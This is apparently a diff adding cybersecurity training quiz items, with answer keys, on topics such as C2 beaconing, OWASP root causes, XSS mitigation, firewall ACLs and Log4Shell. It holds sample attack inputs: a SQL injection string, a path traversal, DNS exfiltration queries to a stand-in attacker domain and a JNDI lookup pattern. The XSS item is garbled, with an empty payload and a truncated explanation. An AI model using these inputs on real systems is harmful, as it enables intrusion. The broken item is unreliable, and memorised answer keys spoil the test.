+      "logData": "PROCESS TREE — WORKSTATION-14 — 2024-04-01 03:22:07\n==============================================\nPID  PPID Name                  Path\n4    0    System\n628  4    smss.exe              C:\\Windows\\System32\\smss.exe\n700  628  csrss.exe             C:\\Windows\\System32\\csrss.exe\n760  628  wininit.exe           C:\\Windows\\System32\\wininit.exe\n  820  760  services.exe        C:\\Windows\\System32\\services.exe\n    1240 820  svchost.exe       C:\\Windows\\System32\\svchost.exe\n    3801 820  svchost.exe       C:\\Users\\Public\\svchost.exe    [!]\n  880  760  lsass.exe           C:\\Windows\\System32\\lsass.exe\n2900 2440 explorer.exe          C:\\Windows\\System32\\explorer.exe\n  4501 2900 chrome.exe          C:\\Program Files\\Google\\Chrome\\chrome.exe\n  4892 2900 cmd.exe             C:\\Windows\\System32\\cmd.exe\n    4900 4892 powershell.exe    C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n      4910 4900 notepad.exe     C:\\Windows\\System32\\notepad.exe  [!]\nNET CONNECTIONS PID 3801: OUT 185.220.101.45:443 128MB/s",
+      "choices": [
+        "PID 3801: svchost.exe running from C:\\Users\\Public\\ (not System32) with PPID=820 (services.exe) — path masquerading; confirmed C2 by 128MB/s outbound to 185.220.101.45",
+        "PID 4910: notepad.exe spawned from powershell.exe — notepad should never be launched from PowerShell and has no network function; indicates process hollowing or injection",
+        "PID 4892: cmd.exe spawned from explorer.exe — normal user activity",
+        "PID 4501: chrome.exe — normal browser process"
+      ],
+      "correct": 0
+    },
+    {
+      "id": "p064",
+      "ch": "2",
+      "type": "ORDERING",
+      "emoji": "📋",
+      "difficulty": "medium",
+      "cat": "Mitigation",
+      "title": "Order the steps to implement a vulnerability management programme",
+      "scenario": "",
+      "question": "Order these vulnerability management programme implementation steps from FIRST to LAST.",
+      "explanation": "VM programme order: (1) Asset inventory — scope starts with knowing what you have. (2) Define scope and cadence — what gets scanned, how often. (3) Risk-rate findings — not all CVEs are equal; context matters. (4) Remediate in priority order — fix the most dangerous first with SLA enforcement. (5) Verify — rescan to confirm the fix worked. Skipping verification is common and results in false confidence. The cycle then repeats continuously. CISA KEV and EPSS scores should supplement CVSS in the risk-rating step.",
+      "hint": "Place the steps in the most secure operational order.",
+      "items": [
+        {
+          "id": "o0",
+          "label": "Define scope, assets, and establish a vulnerability scanning cadence (daily, weekly, monthly by criticality)"
+        },
+        {
+          "id": "o1",
+          "label": "Establish asset inventory — you cannot manage vulnerabilities in systems you don't know exist"
+        },
+        {
+          "id": "o2",
+          "label": "Remediate findings in priority order based on risk rating, with defined SLAs per severity level"
+        },
+        {
+          "id": "o3",
+          "label": "Risk-rate all findings using CVSS + exploitability context + business criticality + exposure"
+        },
+        {
+          "id": "o4",
+          "label": "Verify remediation effectiveness by rescanning and manually confirming fixes"
+        }
+      ],
+      "correctOrder": [
+        "o1",
+        "o0",
+        "o3",
+        "o2",
+        "o4"
+      ]
+    },
+    {
+      "id": "p065",
+      "ch": "2",
+      "type": "DRAG & DROP",
+      "emoji": "🔀",
+      "difficulty": "hard",
+      "cat": "Vulnerability Types",
+      "title": "Match OWASP vulnerability types to their root cause",
+      "scenario": "",
+      "question": "Match each OWASP Top 10 category to the ROOT CAUSE that creates the vulnerability.",
+      "explanation": "Root causes: Injection: no separation between code and data — fix with parameterised queries. Broken Access Control: missing authorisation checks — fix with server-side enforcement on every request. Security Misconfiguration: defaults not changed, features enabled unnecessarily — fix with hardening standards and automated configuration checks. Cryptographic Failures: weak algorithms (MD5, SHA-1), plaintext storage, missing TLS — fix with current algorithm standards. Insecure Design: the deepest problem — no amount of implementation hardening fixes a fundamentally insecure design; requires threat modelling during design phase.",
+      "hint": "Drag each item to the target it best matches.",
+      "items": [
+        {
+          "id": "i0",
+          "label": "Injection (A03)"
+        },
+        {
+          "id": "i1",
+          "label": "Broken Access Control (A01)"
+        },
+        {
+          "id": "i2",
+          "label": "Security Misconfiguration (A05)"
+        },
+        {
+          "id": "i3",
+          "label": "Cryptographic Failures (A02)"
+        },
+        {
+          "id": "i4",
+          "label": "Insecure Design (A04)"
+        }
+      ],
+      "targets": [
+        {
+          "id": "t0",
+          "label": "User-supplied data is interpreted as code or commands by an interpreter due to lack of parameterisation"
+        },
+        {
+          "id": "t1",
+          "label": "Insufficient server-side authorisation checks allow users to access resources beyond their intended permissions"
+        },
+        {
+          "id": "t2",
+          "label": "Insecure defaults, unnecessary features enabled, or missing security hardening in the configuration"
+        },
+        {
+          "id": "t3",
+          "label": "Sensitive data exposed due to weak algorithms, improper key management, or missing encryption"
+        },
+        {
+          "id": "t4",
+          "label": "Security requirements not defined in the design phase — vulnerabilities built into architecture before code is written"
+        }
+      ],
+      "correctMapping": {
+        "i0": "t0",
+        "i1": "t1",
+        "i2": "t2",
+        "i3": "t3",
+        "i4": "t4"
+      }
+    },
+    {
+      "id": "p066",
+      "ch": "2",
+      "type": "HOTSPOT",
+      "emoji": "📍",
+      "difficulty": "medium",
+      "cat": "Indicators of Compromise",
+      "title": "Identify the C2 communication pattern",
+      "scenario": "A threat hunter analyses proxy logs for WORKSTATION-07 over 72 hours.",
+      "question": "Which traffic pattern is the STRONGEST indicator of Command & Control beaconing?",
+      "explanation": "Machine-precise beaconing (298-302s ±2s) while the user is on holiday is the highest-confidence C2 indicator. Key IOCs: (1) Jitter: the ±2 second variation is characteristic of programmatic beaconing (not human). (2) 24/7 continuity: humans don't work continuously — automated malware does. (3) User was on holiday: eliminates any legitimate user-initiated explanation. (4) Consistent small packet size = heartbeat. DNS tunneling (option C) is also serious but the beaconing pattern has more confirmatory context. Dropbox upload may be legitimate. Business-hours traffic is normal.",
+      "hint": "Choose the hotspot label that best answers the prompt.",
+      "diagram": "1. Connections to 185.220.x.x every 298-302 seconds ±2s, 24/7 including weekends, 180-220 bytes per connection - Perfect regular interval with minor jitter — 864 connections over 72 hours. Source: WORKSTATION-07. User was on holiday for the entire 72-hour period.\n2. Connections to Microsoft 365, Google, and Slack during business hours - Traffic correlates with business hours and user activity patterns. Normal enterprise cloud usage.\n3. DNS TXT queries with Base64-encoded subdomains to data.attacker.com - Queries like aGVsbG8=.data.attacker.com — 2.1MB of DNS data over 72 hours. Highly suspicious but separate indicator.\n4. Single 4GB HTTPS upload to Dropbox on Friday at 17:30 - Large upload correlating with end of work week. Could be a legitimate file sync or data exfiltration.",
+      "choices": [
+        "Connections to 185.220.x.x every 298-302 seconds ±2s, 24/7 including weekends, 180-220 bytes per connection",
+        "Connections to Microsoft 365, Google, and Slack during business hours",
+        "DNS TXT queries with Base64-encoded subdomains to data.attacker.com",
+        "Single 4GB HTTPS upload to Dropbox on Friday at 17:30"
+      ],
+      "correct": 0
+    },
+    {
+      "id": "p067",
+      "ch": "2",
+      "type": "FILL BLANK",
+      "emoji": "✏️",
+      "difficulty": "easy",
+      "cat": "Mitigation",
+      "title": "Complete the email security protocol descriptions",
+      "scenario": "",
+      "question": "Fill in the correct email security protocol for each description.",
+      "explanation": "SPF: DNS TXT record listing authorised sending IPs — receiving server checks if the sending IP is in the list. DKIM: private key signs email headers — receiving server looks up public key in DNS to verify signature. Confirms identity AND integrity. DMARC: policy enforcement layer — specifies what to do when SPF/DKIM fail (none/quarantine/reject). Also enables aggregate reporting (rua=) so domain owners see who is sending on their behalf. Correct deployment order: SPF → DKIM → DMARC p=none (monitor) → DMARC p=quarantine → DMARC p=reject.",
+      "hint": "Fill each blank with the most accurate security term.",
+      "blanks": [
+        {
+          "id": "b0",
+          "sentence": "___ is a DNS TXT record that specifies which mail servers are authorised to send email on behalf of a domain — receiving servers check this to detect spoofed senders.",
+          "answer": "SPF",
+          "hint": "DKIM, DMARC, SPF, S/MIME"
+        },
+        {
+          "id": "b1",
+          "sentence": "___ adds a cryptographic signature to email headers using a private key, allowing receiving servers to verify the email was genuinely sent by the stated domain and was not modified in transit.",
+          "answer": "DKIM",
+          "hint": "SPF, DMARC, DKIM, TLS"
+        },
+        {
+          "id": "b2",
+          "sentence": "___ builds on SPF and DKIM, allowing domain owners to specify what receiving servers should do with emails that fail those checks — none (monitor), quarantine (spam), or reject (block).",
+          "answer": "DMARC",
+          "hint": "SPF, DKIM, DMARC, BIMI"
+        }
+      ]
+    },
+    {
+      "id": "p068",
+      "ch": "2",
+      "type": "TERMINAL SIM",
+      "emoji": "💻",
+      "difficulty": "hard",
+      "cat": "Vulnerability Types",
+      "title": "Exploit and remediate a stored XSS vulnerability",
+      "scenario": "A penetration tester is testing a comment field on a product review page. Other users' browsers render these comments.",
+      "question": "Which payload would confirm a Stored XSS vulnerability, and which RESPONSE header would be the MOST effective mitigation?",
+      "explanation": "Stored XSS persists in the database and executes for every user who views the page. The img onerror payload is XSS without a script tag — bypasses naive script-tag filters. CSP (Content-Security-Policy) is the most effective defensive header — restricting script-src prevents the fetch() from executing even if XSS is injected. However, the ROOT CAUSE fix is output encoding (converting HttpOnly cookies prevent JavaScript cookie theft even if XSS executes.",
+      "hint": "Select the command that produces the secure result requested by the prompt.",
+      "answer": "POST /api/reviews HTTP/1.1\nContent-Type: application/json\n{\"product_id\": 42, \"comment\": \"___PAYLOAD___\"}\n\nGoal: Confirm stored XSS AND identify the best preventive header\n\n[XSS CONFIRMED] Comment stored and rendered:\n\nBrowser executes fetch() → sends session cookies to attacker\nAll users viewing this product page are affected\n\n[MITIGATIONS]\n1. Output encoding: htmlspecialchars() all stored content before rendering\n2. Content-Security-Policy: script-src 'self'; prevents external fetch()\n3. HttpOnly cookie flag: prevents JavaScript cookie access entirely\n4. Input validation: reject HTML tags in review fields",
+      "choices": [
+        "Payload:  | Header: Content-Security-Policy: script-src 'self'; img-src 'self'",
+        "Payload: 1' OR 1=1 -- | Header: X-Frame-Options: DENY",
+        "Payload: ../../../etc/passwd | Header: Strict-Transport-Security: max-age=31536000",
+        "Payload: bold text | Header: X-Content-Type-Options: nosniff"
+      ],
+      "correct": 0
+    },
+    {
+      "id": "p069",
+      "ch": "2",
+      "type": "DRAG & DROP",
+      "emoji": "🔀",
+      "difficulty": "medium",
+      "cat": "Threat Actors",
+      "title": "Match attack motivations to threat actor types",
+      "scenario": "",
+      "question": "Match each primary motivation to the threat actor type MOST commonly associated with it.",
+      "explanation": "Cybercriminal groups: profit-motivated — RaaS, BEC, card fraud. Nation-state/APT: geopolitical — long dwell time, custom tooling, intelligence collection, infrastructure attacks. Hacktivists: ideological — DDoS, defacement, data leaks to embarrass. Malicious insider: personal — disgruntled employee, financial pressure, coercion; uniquely dangerous because they have legitimate access that bypasses perimeter controls. Script kiddies: no custom capability — use Metasploit, public exploits, YouTube tutorials; opportunistic targets only.",
+      "hint": "Drag each item to the target it best matches.",
+      "items": [
+        {
+          "id": "i0",
+          "label": "Financial gain through ransomware and payment fraud"
+        },
+        {
+          "id": "i1",
+          "label": "Geopolitical espionage and long-term infrastructure access"
+        },
+        {
+          "id": "i2",
+          "label": "Ideological or political protest through disruption"
+        },
+        {
+          "id": "i3",
+          "label": "Personal grievance or coercion with insider access"
+        },
+        {
+          "id": "i4",
+          "label": "Fame, curiosity, or peer recognition with low-skill attacks"
+        }
+      ],
+      "targets": [
+        {
+          "id": "t0",
+          "label": "Organised cybercriminal groups (e.g., RaaS affiliates, banking trojans)"
+        },
+        {
+          "id": "t1",
+          "label": "Nation-state / APT actors (e.g., APT28, APT29, Lazarus Group)"
+        },
+        {
+          "id": "t2",
+          "label": "Hacktivists (e.g., Anonymous, political hacking groups)"
+        },
+        {
+          "id": "t3",
+          "label": "Malicious insider (current or former employee with authorised access)"
+        },
+        {
+          "id": "t4",
+          "label": "Script kiddies (low technical skill, use existing tools and tutorials)"
+        }
+      ],
+      "correctMapping": {
+        "i0": "t0",
+        "i1": "t1",
+        "i2": "t2",
+        "i3": "t3",
+        "i4": "t4"
+      }
+    },
+    {
+      "id": "p070",
+      "ch": "2",
+      "type": "CONFIG/ACL",
+      "emoji": "⚙️",
+      "difficulty": "medium",
+      "cat": "Mitigation",
+      "title": "Configure Windows Defender Firewall rules for a workstation",
+      "scenario": "A Windows 10 workstation in a corporate domain needs firewall rules. Requirements: allow RDP only from IT admin subnet (10.10.0.0/24), allow all outbound, block inbound everything else.",
+      "question": "RDP inbound restricted to IT admin subnet only?",
+      "explanation": "Rule 2 is INCORRECT — RDP (TCP 3389) open to 0.0.0.0/0 means internet-accessible RDP. This is one of the most exploited configurations in ransomware attacks. RDP must be restricted to specific management subnets or accessible only via VPN/jump host. All other rules are correctly configured: restricted RDP from IT subnet, permit-all outbound (common workstation policy), block-all-other-inbound (default deny), and allowing DC communication for Group Policy application and authentication.",
+      "hint": "Compare the existing rule set with least privilege and the requested business outcome.",
+      "currentConfig": "Rule | Direction | Protocol/Port | Remote Address | Action/Correct?\n1. Allow RDP from IT admins | Inbound TCP 3389 | 10.10.0.0/24 | ?\n2. Allow RDP from anywhere | Inbound TCP 3389 | 0.0.0.0/0 (Any) | ?\n3. Allow all outbound | Outbound Any | Any | ?\n4. Block all other inbound | Inbound Any | Any | ?\n5. Allow inbound from domain controllers | Inbound Any | 10.0.1.0/24 (DC subnet) | ?",
+      "choices": [
+        "CORRECT",
+        "INCORRECT"
+      ],
+      "correct": 0
+    },
+    {
+      "id": "p071",
+      "ch": "2",
+      "type": "LOG ANALYSIS",
+      "emoji": "📊",
+      "difficulty": "hard",
+      "cat": "IoC",
+      "title": "Analyse Windows event logs for ransomware staging",
+      "scenario": "",
+      "question": "Which log entries form the MOST definitive evidence of a ransomware staging attack in progress?",
+      "explanation": "The kill chain evidence: (1) 4,892 file accesses in 8 minutes across Finance, HR, and Legal at 02:14 AM — a backup service account doesn't need to enumerate all files across all sensitive directories simultaneously. This is reconnaissance (mapping valuable targets for encryption). (2) EventID 7045 — new service from C:\\Windows\\Temp\\ named \"WindowsSecurityPatch\" — malicious service installation for persistence/payload execution. Legitimate Windows patches don't install from Temp with generic names. The chain: compromised service account → lateral movement to file server → data reconnaissance → ransomware payload deployment. Respond immediately: isolate the file server and the source workstation.",
+      "hint": "Look for the event, timestamp, source, and outcome that prove the finding.",
+      "logData": "Security Event Log — FILE-SERVER-01 — 2024-04-01\n======================================================\n[4624] 02:14:22 DOMAIN\\svc_backup  Logon Type:3 (Network)  Source:WORKSTATION-14\n[4624] 02:14:24 DOMAIN\\svc_backup  Logon Type:3 (Network)  Source:WORKSTATION-14\n[4663] 02:14:35 DOMAIN\\svc_backup  Object:C:\\Finance\\  Access:ReadData ListDirectory\n[4663] 02:14:36 DOMAIN\\svc_backup  Object:C:\\HR\\       Access:ReadData ListDirectory\n[4663] 02:14:38 DOMAIN\\svc_backup  Object:C:\\Legal\\    Access:ReadData ListDirectory\n[5145] 02:14:40 DOMAIN\\svc_backup  Share:\\\\FILE-SERVER-01\\Finance$  Access:GRANTED\n[4663] 02:15:01 DOMAIN\\svc_backup  Object:C:\\Finance\\Q4-Results.xlsx  Access:ReadData\n...4,892 file access events over 8 minutes...\n[7045] 02:23:15  New Service: \"WindowsSecurityPatch\"  Path:C:\\Windows\\Temp\\patch.exe\n[4697] 02:23:15  Service Installed: \"WindowsSecurityPatch\"",
+      "choices": [
+        "EventID 4624 (network logon) — service account logins are always suspicious",
+        "EventID 4663 showing 4,892 file accesses across Finance, HR, and Legal directories in 8 minutes via a service account at 02:14 AM — reconnaissance/staging — followed immediately by EventID 7045 installing a disguised executable from Windows\\Temp — persistence/payload deployment",
+        "EventID 5145 showing share access was granted — this is normal for backup service accounts",
+        "The 02:14 AM timestamp alone — off-hours logins are always malicious"
+      ],
+      "correct": 1
+    },
+    {
+      "id": "p072",
+      "ch": "2",
+      "type": "HOTSPOT",
+      "emoji": "📍",
+      "difficulty": "medium",
+      "cat": "Vulnerability Types",
+      "title": "Select the highest-risk finding from a code review",
+      "scenario": "A code review of a financial application finds four issues. Security resources allow fixing only ONE this sprint.",
+      "question": "Which finding should be prioritised FIRST?",
+      "explanation": "SQL injection on an unauthenticated financial endpoint is the highest priority: (1) Unauthenticated access — any internet user can query any account balance. (2) SQL injection — attacker can extract all account data, authentication credentials, and potentially achieve RCE via xp_cmdshell or file write. (3) Financial data — direct regulatory and liability impact. Logging cleartext PANs violates PCI DSS and should be fixed urgently, but the SQLi creates immediate, complete system compromise risk. Verbose errors aid SQLi attacks but are informational. Internal HTTP is a defence-in-depth gap.",
+      "hint": "Choose the hotspot label that best answers the prompt.",
+      "diagram": "1. SQL query built by concatenating user-supplied account ID directly into a query string - Found in: GET /api/account/balance?id=[USER_INPUT]\nCode: \"SELECT balance FROM accounts WHERE id=\" + request.getParameter(\"id\")\nNo parameterisation. No authentication check on the endpoint.\n2. Application logs contain cleartext credit card numbers for debugging - Log line: \"Processing payment for card: 4532-1234-5678-9012\"\nLogs retained for 90 days on shared server. Violates PCI DSS Requirement 3.\n3. Some internal API calls use HTTP instead of HTTPS - Internal microservice-to-microservice calls on the internal network use HTTP. External traffic is HTTPS.\n4. Error messages reveal database table names and column names - On invalid input: \"Column 'account_number' does not exist in table 'customer_accounts'\"\nProvides useful information to attackers for SQL injection refinement.",
+      "choices": [
+        "SQL query built by concatenating user-supplied account ID directly into a query string",
+        "Application logs contain cleartext credit card numbers for debugging",
+        "Some internal API calls use HTTP instead of HTTPS",
+        "Error messages reveal database table names and column names"
+      ],
+      "correct": 0
+    },
+    {
+      "id": "p073",
+      "ch": "3",
+      "type": "DRAG & DROP",
+      "emoji": "🔀",
+      "difficulty": "easy",
+      "cat": "Network Architecture",
+      "title": "Match network security zones to their trust level and purpose",
+      "scenario": "",
+      "question": "Match each network zone to its correct trust level and primary purpose.",
+      "explanation": "Zone trust hierarchy: Internet: zero trust — all inbound traffic is untrusted. DMZ: semi-trusted — web servers, mail servers live here; can receive internet traffic but cannot initiate connections to internal network. Internal: trusted — corporate workstations, internal servers. Management/OOB: most restricted — only administrators can access; separate physical or logical path to manage network devices without crossing production network. Guest: isolated — internet only, no corporate access; prevents guest devices attacking corporate systems.",
+      "hint": "Drag each item to the target it best matches.",
+      "items": [
+        {
+          "id": "i0",
+          "label": "Internet / Untrusted Zone"
+        },
+        {
+          "id": "i1",
+          "label": "DMZ / Screened Subnet"
+        },
+        {
+          "id": "i2",
+          "label": "Internal Corporate Network"
+        },
+        {
+          "id": "i3",
+          "label": "Management / OOB Network"
+        },
+        {
+          "id": "i4",
+          "label": "Guest / Partner Network"
+        }
+      ],
+      "targets": [
+        {
+          "id": "t0",
+          "label": "Untrusted — all external traffic originates here; no trust, implicit deny inbound"
+        },
+        {
+          "id": "t1",
+          "label": "Semi-trusted — hosts public-facing services; isolated from both internet and internal network"
+        },
+        {
+          "id": "t2",
+          "label": "Trusted — internal users and corporate assets; protected by perimeter controls"
+        },
+        {
+          "id": "t3",
+          "label": "Highly restricted — only security/IT staff; out-of-band access to network device management interfaces"
+        },
+        {
+          "id": "t4",
+          "label": "Isolated — internet access only; no access to corporate resources; used by visitors and personal devices"
+        }
+      ],
+      "correctMapping": {
+        "i0": "t0",
+        "i1": "t1",
+        "i2": "t2",
+        "i3": "t3",
+        "i4": "t4"
+      }
+    },
+    {
+      "id": "p074",
+      "ch": "3",
+      "type": "TERMINAL SIM",
+      "emoji": "💻",
+      "difficulty": "medium",
+      "cat": "Cloud Architecture",
+      "title": "Audit S3 bucket permissions with AWS CLI",
+      "scenario": "A cloud security engineer audits an S3 bucket \"company-reports-prod\" for public access exposure.",
+      "question": "Select the correct AWS CLI command to check the bucket's public access block configuration.",
+      "explanation": "get-public-access-block shows the four settings that override all other access grants: BlockPublicAcls (blocks new public ACLs), IgnorePublicAcls (ignores existing public ACLs), BlockPublicPolicy (blocks public bucket policies), RestrictPublicBuckets (restricts access to only AWS service principals and authorised users). All four being FALSE means ACLs or policies could inadvertently expose the bucket publicly. This is a critical finding for a \"prod\" bucket containing company reports. Enable all four at the account level to prevent any S3 bucket from being accidentally made public.",
+      "hint": "Select the command that produces the secure result requested by the prompt.",
+      "answer": "engineer@workstation:~$ aws configure list\n  access_key: ***\n  region: eu-west-1\nengineer@workstation:~$ # Goal: Check if public access block is enabled\nengineer@workstation:~$ # Bucket: company-reports-prod\n\n{\n  \"PublicAccessBlockConfiguration\": {\n    \"BlockPublicAcls\": false,\n    \"IgnorePublicAcls\": false,\n    \"BlockPublicPolicy\": false,\n    \"RestrictPublicBuckets\": false\n  }\n}\n[CRITICAL] All four Block Public Access settings are DISABLED\n[RISK] Bucket ACLs or bucket policy could grant public access\n[REMEDIATION]\naws s3api put-public-access-block --bucket company-reports-prod \\\n  --public-access-block-configuration \\\n  BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true",
+      "choices": [
+        "aws s3api get-public-access-block --bucket company-reports-prod",
+        "aws s3 ls s3://company-reports-prod",
+        "aws s3api get-bucket-acl --bucket company-reports-prod",
+        "aws s3api delete-bucket --bucket company-reports-prod"
+      ],
+      "correct": 0
+    },
+    {
+      "id": "p075",
+      "ch": "3",
+      "type": "ORDERING",
+      "emoji": "📋",
+      "difficulty": "medium",
+      "cat": "Application Security",
+      "title": "Order the steps of a secure SDLC (Shift-Left model)",
+      "scenario": "",
+      "question": "Order these secure development lifecycle activities from EARLIEST to LATEST in the development pipeline.",
+      "explanation": "Shift-left security order: (1) Security requirements + threat modelling — design phase, cheapest fix point. (2) SAST in IDE and CI — catches issues during coding before they compile. (3) Security code review — human review before merge. (4) DAST — tests the running application in staging. (5) Penetration test — adversarial testing pre-production. Cost to fix increases at each stage (1x → 100x). The goal of shift-left is to detect and fix security issues as early as possible in the development process, drastically reducing cost and time to remediate.",
+      "hint": "Place the steps in the most secure operational order.",
+      "items": [
+        {
+          "id": "o0",
+          "label": "Penetration test of production-equivalent staging environment before release"
+        },
+        {
+          "id": "o1",
+          "label": "Security requirements definition and threat modelling during system design"
+        },
+        {
+          "id": "o2",
+          "label": "SAST (static analysis) integrated into IDE and CI/CD pipeline during coding"
+        },
+        {
+          "id": "o3",
+          "label": "DAST (dynamic analysis) against running application in test/staging environment"
+        },
+        {
+          "id": "o4",
+          "label": "Security code review by a second developer before merging to main branch"
+        }
+      ],
+      "correctOrder": [
+        "o1",
+        "o2",
+        "o4",
+        "o3",
+        "o0"
+      ]
+    },
+    {
+      "id": "p076",
+      "ch": "3",
+      "type": "HOTSPOT",
+      "emoji": "📍",
+      "difficulty": "hard",
+      "cat": "Infrastructure Security",
+      "title": "Identify the most critical network architecture flaw",
+      "scenario": "A security architect reviews a corporate network diagram. Identify the MOST critical architectural security flaw.",
+      "question": "Which architectural decision represents the MOST critical security flaw?",
+      "explanation": "Flat /16 network with no segmentation is the root architectural flaw — it enables unrestricted lateral movement. Once any single host is compromised, the attacker has unimpeded access to: financial servers, HR systems, medical devices, backup systems, and management interfaces. All other identified issues (management interface exposure, backup on same segment, DNS) are CONSEQUENCES of the flat network that would be mitigated by proper segmentation. With segmentation: compromised workstation reaches only its VLAN; firewall rules control cross-VLAN traffic; ransomware cannot reach backups; management interfaces are on an isolated OOB VLAN.",
+      "hint": "Choose the hotspot label that best answers the prompt.",
+      "diagram": "1. Flat /16 network — all servers, workstations, medical devices on one VLAN - No internal segmentation. Finance, HR, servers, IoT devices, and guest WiFi all share 10.0.0.0/16. Single compromised workstation can reach all systems.\n2. Network device management interfaces accessible from user VLAN - Router, switch, and firewall management consoles reachable from 10.0.0.0/16. No dedicated management network.\n3. Backup server on same network segment as production systems - Ransomware can reach and encrypt backups from any compromised production host.\n4. Internal DNS server resolves both internal and external queries - Split-horizon DNS not implemented. Internal hostnames resolvable from internal network only — as intended.",
+      "choices": [
+        "Flat /16 network — all servers, workstations, medical devices on one VLAN",
+        "Network device management interfaces accessible from user VLAN",
+        "Backup server on same network segment as production systems",
+        "Internal DNS server resolves both internal and external queries"
+      ],
+      "correct": 0
+    },
+    {
+      "id": "p077",
+      "ch": "3",
+      "type": "FILL BLANK",
+      "emoji": "✏️",
+      "difficulty": "easy",
+      "cat": "Cloud Architecture",
+      "title": "Complete the cloud service model responsibility descriptions",
+      "scenario": "",
+      "question": "Fill in who is responsible for each security element in each cloud service model.",
+      "explanation": "IaaS (e.g., EC2): customer owns guest OS and above. Provider owns physical, network fabric, hypervisor. SaaS (e.g., Salesforce, Microsoft 365): provider owns everything except customer data and user access configuration. The customer cannot patch the application — they must trust the provider. CASB: Cloud Access Security Broker — four functions: Visibility (shadow IT discovery), Compliance (DLP, data classification), Data Security (encryption, rights management), Threat Protection (anomaly detection, malware scanning). Required for organisations with users accessing many cloud services.",
+      "hint": "Fill each blank with the most accurate security term.",
+      "blanks": [
+        {
+          "id": "b0",
+          "sentence": "In IaaS, the customer is responsible for ___ — the cloud provider manages physical hardware and the hypervisor.",
+          "answer": "guest OS patching and hardening",
+          "hint": "physical datacenter security, hypervisor updates, guest OS patching and hardening, network backbone availability"
+        },
+        {
+          "id": "b1",
+          "sentence": "In SaaS, the provider is responsible for ___ — the customer is only responsible for their data and user access management.",
+          "answer": "application security and OS maintenance",
+          "hint": "user data classification, identity federation setup, application security and OS maintenance, network egress filtering"
+        },
+        {
+          "id": "b2",
+          "sentence": "A ___ is a cloud security tool that sits between users and cloud service providers to enforce security policies, provide visibility into shadow IT, and apply DLP controls.",
+          "answer": "CASB",
+          "hint": "WAF, SIEM, CASB, CSPM"
+        }
+      ]
+    },
+    {
+      "id": "p078",
+      "ch": "3",
+      "type": "CONFIG/ACL",
+      "emoji": "⚙️",
+      "difficulty": "medium",
+      "cat": "Network Architecture",
+      "title": "Complete a network ACL for a multi-tier web application",
+      "scenario": "A three-tier web application: Web tier (10.10.1.0/24), App tier (10.10.2.0/24), DB tier (10.10.3.0/24). Internet connects to web tier only.",
+      "question": "Allow HTTPS from internet to web tier?",
+      "explanation": "Correct three-tier ACL: (1) Internet → Web tier HTTPS: PERMIT — web servers must be internet-accessible. (2) Internet → App tier: DENY — application servers must never be directly internet-accessible. (3) Web → App on 8080: PERMIT — web servers need to call application servers on the specific app port only. (4) App → DB on 3306: PERMIT — app servers need database access on MySQL port only. (5) Web → DB: DENY — web servers must never directly access the database; all DB access goes through the app tier (prevents SQLi on web tier from directly hitting DB). This enforces proper traffic flow and limits blast radius.",
+      "hint": "Compare the existing rule set with least privilege and the requested business outcome.",
+      "currentConfig": "# | Source | Destination | Port | Action\n1. 0.0.0.0/0 | 10.10.1.0/24 | TCP 443 | ?\n2. 0.0.0.0/0 | 10.10.2.0/24 | Any | ?\n3. 10.10.1.0/24 | 10.10.2.0/24 | TCP 8080 | ?\n4. 10.10.2.0/24 | 10.10.3.0/24 | TCP 3306 | ?\n5. 10.10.1.0/24 | 10.10.3.0/24 | Any | ?",
+      "choices": [
+        "PERMIT",
+        "DENY"
+      ],
+      "correct": 0
+    },
+    {
+      "id": "p079",
+      "ch": "3",
+      "type": "DRAG & DROP",
+      "emoji": "🔀",
+      "difficulty": "hard",
+      "cat": "Infrastructure Security",
+      "title": "Match endpoint security technologies to what they protect against",
+      "scenario": "",
+      "question": "Match each endpoint security technology to the threat category it MOST effectively addresses.",
+      "explanation": "FDE: stolen laptop = encrypted data = no breach. Does NOT protect against network attacks or malware. EDR: behavioural monitoring — detects fileless malware, process injection, lateral movement that signature AV misses. Application whitelisting: gold standard against malware execution — if it's not on the list, it doesn't run. Hardest to implement (admin overhead). Host firewall: limits network exposure of the host itself. Patch management: closes known vulnerability windows — most ransomware exploits known, unpatched vulnerabilities. All five together provide layered endpoint defence.",
+      "hint": "Drag each item to the target it best matches.",
+      "items": [
+        {
+          "id": "i0",
+          "label": "Full Disk Encryption (FDE/BitLocker)"
+        },
+        {
+          "id": "i1",
+          "label": "Endpoint Detection and Response (EDR)"
+        },
+        {
+          "id": "i2",
+          "label": "Application Whitelisting (WDAC/AppLocker)"
+        },
+        {
+          "id": "i3",
+          "label": "Host-based Firewall"
+        },
+        {
+          "id": "i4",
+          "label": "Patch Management"
+        }
+      ],
+      "targets": [
+        {
+          "id": "t0",
+          "label": "Data exposure from physical theft or loss of the device — protects data at rest on stolen hardware"
+        },
+        {
+          "id": "t1",
+          "label": "Post-exploitation lateral movement and fileless attacks — detects and responds to behavioural anomalies after initial compromise"
+        },
+        {
+          "id": "t2",
+          "label": "Execution of unauthorised or malicious binaries — blocks anything not on the approved application list"
+        },
+        {
+          "id": "t3",
+          "label": "Inbound/outbound network connections from the host — limits attack surface and C2 communication"
+        },
+        {
+          "id": "t4",
+          "label": "Known CVE exploitation — closes security holes by keeping software up to date"
+        }
+      ],
+      "correctMapping": {
+        "i0": "t0",
+        "i1": "t1",
+        "i2": "t2",
+        "i3": "t3",
+        "i4": "t4"
+      }
+    },
+    {
+      "id": "p080",
+      "ch": "3",
+      "type": "LOG ANALYSIS",
+      "emoji": "📊",
+      "difficulty": "medium",
+      "cat": "Application Security",
+      "title": "Analyse dependency scan results for supply chain risk",
+      "scenario": "",
+      "question": "Which remediation should be performed FIRST and what additional control should be applied immediately?",
+      "explanation": "Log4Shell (CVE-2021-44228) is P0: CVSS 10.0 + CISA KEV + public weaponised exploits + confirmed active exploitation in the wild = highest possible risk. Even though Spring4Shell (CVE-2022-22965) is also KEV, Log4Shell has broader exploitation history and a higher CVSS. Interim WAF virtual patch: block JNDI lookup patterns (${jndi:ldap://...) in all inputs while the update is tested and deployed. This stops active exploitation without a code change. Then update Log4j → Spring Framework → jackson-databind in priority order. Abandoned dependencies are a long-term risk but not an immediate emergency.",
+      "hint": "Look for the event, timestamp, source, and outcome that prove the finding.",
